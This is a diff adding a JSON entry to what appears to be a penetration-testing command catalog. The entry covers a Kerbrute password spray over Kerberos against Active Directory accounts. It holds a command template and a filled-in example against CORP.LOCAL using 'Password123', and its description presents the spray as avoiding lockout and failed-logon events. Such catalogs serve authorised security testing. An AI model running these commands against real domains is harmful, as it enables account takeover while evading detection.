@@ -1,0 +1,23 @@
+{
+  "id": "kerbrute-spray",
+  "name": "Kerbrute Password Spray",
+  "command": "kerbrute passwordspray -d '<domain>' --dc '<ip>' '<userlist>' '<password>'",
+  "description": "Password spray a single password against a list of users via Kerberos (avoids lockout, no failed logon events)",
+  "platform": "linux",
+  "requires": [
+    "no-creds"
+  ],
+  "protocols": [
+    "kerberos"
+  ],
+  "tags": [
+    "kerbrute",
+    "password-spray",
+    "kerberos",
+    "brute-force",
+    "domain-users"
+  ],
+  "examples": [
+    "kerbrute passwordspray -d 'CORP.LOCAL' --dc '192.168.1.100' users.txt 'Password123'"
+  ]
+}
